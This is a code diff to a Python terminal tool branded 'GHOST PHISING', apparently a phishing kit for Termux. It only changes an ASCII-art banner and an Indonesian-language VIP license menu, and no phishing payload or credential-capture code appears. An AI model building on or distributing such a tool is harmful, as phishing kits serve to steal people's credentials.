@@ -55,13 +55,13 @@ def banner(role_name):
     clear()
     print(f"""
 {C}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀           {BG_RED}{W} 💥 GHOST PHISING 💥 {RESET}
-{C}⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀      {C}localhost   {W}: {Y}http://127.0.0.1:8080
-{Y}⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀      {G}role        {W}: {r_col}{role_name}
-{Y}⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀      {Y}tools       {W}: {W}Ghost_Phsing
+{C}⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀      {C}Localhost   {W}: {Y}http://127.0.0.1:8080
+{Y}⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀      {G}Role        {W}: {r_col}{role_name}
+{Y}⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀      {Y}Tools       {W}: {W}Ghost_Phsing
 {G}⠀⡼⢡⣾⢓⡵⠃⡐⠁⠀⡜⠀⠐⠃⣖⣲⡄⠀⠀⠱⠀⠈⠢⠈⢮⣃⣷⢄⢳⠀      {LB}version     {W}: {W}Version New (stable)
 {G}⢰⠃⣿⡹⣫⠃⡌⠀⠄⠈⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠣⠀⠀⠱⠈⣯⡻⣼⠈⡇      {R}Privacy     {W}: {R}Encrypted
 {C}⡞⢈⢿⡾⡃⠰⠀⠀⠀⠀⠀⠀⠀⠀⣘⣋⠀⠀⠀⠀⠀⠀⠀⠀⠇⢸⢿⣿⢠⢸      {M}Network     {W}: {W}P2P Stable
-{C}⡇⢸⡜⣴⠃⠀⠀⠀⠀⠀⣀⣀⣤⡎⠹⡏⢹⣦⣀⣀⠀⠀⠀⠀⢈⠘⣧⢣⡟⢸      {C}database    {W}: {W}PostgreSQL
+{C}⡇⢸⡜⣴⠃⠀⠀⠀⠀⠀⣀⣀⣤⡎⠹⡏⢹⣦⣀⣀⠀⠀⠀⠀⢈⠘⣧⢣⡟⢸      {C}Database    {W}: {W}PostgreSQL
 {B}⢧⢊⢳⡏⣤⠸⠀⠀⠀⢸⣿⣿⣿⡇⢰⡇⢠⣿⣿⣿⣷⠀⠀⠀⡆⢸⢹⡼⣱⢸      {Y}Strength    {W}: {W}Ghost
 {B}⢸⡘⢷⣅⣿⢂⢃⠐⠂⣿⣿⣿⣿⣿⣼⣇⣾⣿⣿⣿⣿⠁⠂⡰⡠⣿⢨⡾⠃⡇      {G}Music       {W}: {MUSIC_STATUS}
 {M}⠀⢳⡱⣝⠻⡼⣆⡁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠐⣰⣇⠿⣋⠝⡼⠀      {C}Status      {W}: {G}Active
@@ -149,7 +149,7 @@ def start_server(role):
 def login_system():
     while True:
         clear()
-        print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {W}SISTEM LISENSI GHOST-PHISING 🗝️ {R}[VIP]\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {C}• {W}getkey    {Y}: Ambil ID Unit\n {C}• {W}verifkey  {Y}: Masuk ke Tools\n\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n     {W}SISTEM LISENSI GHOST-PHISING 🗝️ {R}[VIP]\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {C}• {W}getkey    {Y}: Ambil ID Unit\n {C}• {W}verifkey  {Y}: Masuk ke Tools\n\n{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         cmd = input(f"{W}Ghost > {G}").strip().lower()
         if cmd == "getkey": 
             print(f"{Y}[!] ID Unit Lu: {W}{get_termux_id()}"); input("\nTekan Enter...")
